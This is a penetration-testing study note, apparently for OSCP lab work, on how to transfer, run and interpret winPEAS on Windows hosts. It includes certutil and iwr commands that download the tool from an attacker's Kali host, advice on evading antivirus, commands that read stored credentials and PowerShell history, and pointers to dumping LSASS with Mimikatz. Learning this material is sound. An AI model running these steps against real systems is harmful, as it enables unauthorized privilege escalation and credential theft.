# winPEAS — Windows Local Enumeration

Purpose:
- Identify privilege escalation paths
- Highlight misconfigurations (writable services, tasks, unquoted paths)
- Surface credentials (registry, files, history, autologon)
- Reduce manual enumeration time

The Windows mirror of [[LinPEAS]] — same idea, different findings. winPEAS finds the path; [[Windows_Priv_Esc]] is where you execute it.

---

## When to Run winPEAS

Run winPEAS when:
- You have any Windows shell (cmd, PowerShell, RDP)
- You are NOT SYSTEM/admin yet
- You want privesc paths fast before going fully manual

---

## Where winPEAS Lives on Kali

Always serve from the installed package path — never use stale copies:

```
/usr/share/peass/winpeas/winPEASx64.exe     ← 64-bit (most targets)
/usr/share/peass/winpeas/winPEASx86.exe     ← 32-bit
/usr/share/peass/winpeas/winPEASany.exe     ← any arch (.NET, more compatible)
/usr/share/peass/winpeas/winPEAS.bat        ← if .exe is blocked by AV
/usr/share/peass/linpeas/linpeas.sh         ← Linux targets
```

Serve it:
```bash
cd /usr/share/peass/winpeas && python3 -m http.server 8000
```

> **Which one?** Try `winPEASx64.exe` first. If AV kills it, fall back to `winPEASany.exe`, then `winPEAS.bat` (no binary to flag). Check the target arch with `echo %PROCESSOR_ARCHITECTURE%`.

---

## Transferring winPEAS

See [[File_Transfer]] and [[UNC_Execution]]. Quick version:

```cmd
certutil -urlcache -f http://<KALI_IP>:8000/winPEASx64.exe winPEASx64.exe
```
```powershell
iwr http://<KALI_IP>:8000/winPEASx64.exe -o winPEASx64.exe
```

---

## Running winPEAS

From a writable directory (recommended): `C:\Users\Public\` or `%TEMP%`.

```cmd
.\winPEASx64.exe
```

**Save the output** so a scroll or disconnect doesn't lose it:
```cmd
.\winPEASx64.exe > C:\Users\Public\winpeas.txt
```
→ Then exfil `winpeas.txt` to Kali and review it there with `less -R` (keeps colors) — same discipline as saving `linpeas.out`.

Notes:
- Expect **very noisy** output — do not read top-to-bottom (see reading order below)
- Antivirus may block it → rename the file, use `winPEASany.exe`, or the `.bat`
- Colors won't render in a raw shell; `> file` then review on Kali fixes that

---

## Reading the Output — Where to Look (and in what order)

winPEAS dumps thousands of lines. **Don't read top-to-bottom — jump to these sections in priority order.** The first hit usually ends the hunt. Save to a file, then search (`/term`) instead of scrolling.

| # | Jump to this section | Hunting for | Why it's this high |
|---|---|---|---|
| 1 | **Current token privileges** | `SeImpersonate`, `SeBackup`, `SeRestore`, `SeDebug`, `SeTakeOwnership` (shown in **red**) | Direct path to SYSTEM — no exploit needed |
| 2 | **Service Information** → "modifiable" / writable binary | services running as SYSTEM with a writable binary, **unquoted path**, or reconfigurable DACL | overwrite/redirect → SYSTEM on restart |
| 3 | **Scheduled Applications / Tasks** | task running as SYSTEM with a writable script/binary | hijack the script → SYSTEM on next run |
| 4 | **AlwaysInstallElevated** | both HKLM+HKCU = `0x1` | any `.msi` runs as SYSTEM |
| 5 | **AutoLogon credentials** | `DefaultUserName` / `DefaultPassword` in plaintext | instant reusable creds |
| 6 | **PowerShell history + saved creds** | `ConsoleHost_history.txt`, `cmdkey`, DPAPI, registry creds | reuse with `runas` / WinRM / RDP |
| 7 | **Interesting files / passwords in files** | `unattend.xml`, `web.config`, `.kdbx`, files containing "password" | plaintext or crackable creds |
| 8 | **Network / Active Ports** | listeners on `127.0.0.1` not in your nmap | hidden internal service → port forward |
| 9 | **System info / hotfixes / Windows version** | missing KBs, old build | **LAST resort** — kernel CVEs, noisy, can bluescreen |

> **Order matters.** token privileges → services → tasks → AlwaysInstallElevated → creds covers the vast majority of OSCP Windows boxes. Kernel exploits live at the **bottom**, not the top — same rule as Linux. Full execution steps for each: [[Windows_Priv_Esc]].

---

## Output Color Key

winPEAS colors findings by likelihood — learn the two that matter:

| Color | Meaning |
|---|---|
| **Red / bright** | High-confidence privesc path — check every one first |
| **Green** | Enabled / active (e.g. an enabled privilege) — context |
| Blue | Users, folders, informational |
| Cyan | Usernames / current context |

> Colors only render with ANSI support. In a raw shell you'll see escape codes — that's why you save to a file and review with `less -R` on Kali.

---

## Things to Watch

### Token Privileges (highest value)
If winPEAS shows any of these enabled (red), that's usually your whole path — go straight to [[Windows_Priv_Esc]] section 1:
- `SeImpersonatePrivilege` → PrintSpoofer / GodPotato → SYSTEM
- `SeBackupPrivilege` → read + dump SAM/SYSTEM hives → offline hashes
- `SeRestorePrivilege` / `SeTakeOwnershipPrivilege` → overwrite/own a SYSTEM binary
- `SeDebugPrivilege` → dump LSASS for creds

### Domain Name (AD Context)
If winPEAS shows a domain (e.g. `Domain Name: OSCP.LAB`):
- Lateral movement becomes possible
- Domain tools (Kerberoasting, BloodHound, Mimikatz) are now in play

Next steps:
```cmd
whoami /groups
net user /domain
net group "Domain Admins" /domain
```
→ See [[Active_Directory_Attacks]].

### Cached / Stored Credentials
Windows stores creds from logged-in users, services, and tasks in several places — registry, LSASS memory, config files, PowerShell history.

```cmd
cmdkey /list
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\ /s /a
```
→ If you have admin or `SeDebugPrivilege`: **run Mimikatz** against LSASS. See [[Mimikatz]].

### PowerShell History
Users type passwords, scripts, and paths straight into PowerShell — all logged to disk:
```cmd
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
Hunting for: plaintext passwords, network paths, admin scripts, backup jobs. **Always check this.**

### Scheduled Applications / Tasks
winPEAS flags tasks that run automatically, often as SYSTEM, sometimes writable by users. Confirm manually:
```cmd
schtasks /query /fo LIST /v
```
Check: does it run as SYSTEM? Is the executable/script path writable by you? → [[Windows_Priv_Esc]] section 3.

### AutoLogon Credentials (Plaintext in Registry)
One of the most reliable finds in AD environments. Windows stores AutoLogon passwords in plaintext under:
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

winPEAS output looks like:
```
Looking for AutoLogon credentials (T1552.002)
    Some AutoLogon credentials were found
    DefaultDomainName  :  DOMAIN
    DefaultUserName    :  DOMAIN\username
    DefaultPassword    :  PlaintextPasswordHere
```

**Critical gotcha:** `DefaultUserName` may show the display name or a slightly different string from the real sAMAccountName. Always verify the actual username before assuming it's correct:

```bash
netexec smb <IP> -u <guessed_user> -p '<password>'
```

Once confirmed → try WinRM, SMB, NTDS dump depending on account rights. See [[Active_Directory_Attacks]].

### Active Ports (hidden internal services)
```
127.0.0.1:5985   ← loopback only → hidden (WinRM)
127.0.0.1:3306   ← loopback only → hidden (MySQL)
```
Read the local address: `0.0.0.0:*` = external (your nmap saw it); **`127.0.0.1:*` = loopback-only = hidden.** Cross-reference against your nmap — any loopback port that wasn't in the scan is a new attack surface. Forward it out with [[Ligolo]] (subnet) or [[Chisel]] (one port). Manual equivalent: `netstat -ano`.

---

## Related Notes

- [[Windows_Priv_Esc]]
- [[Windows_Common_Commands]]
- [[Active_Directory_Attacks]]
- [[Mimikatz]]
- [[UNC_Execution]]
- [[File_Transfer]]
- [[LinPEAS]]
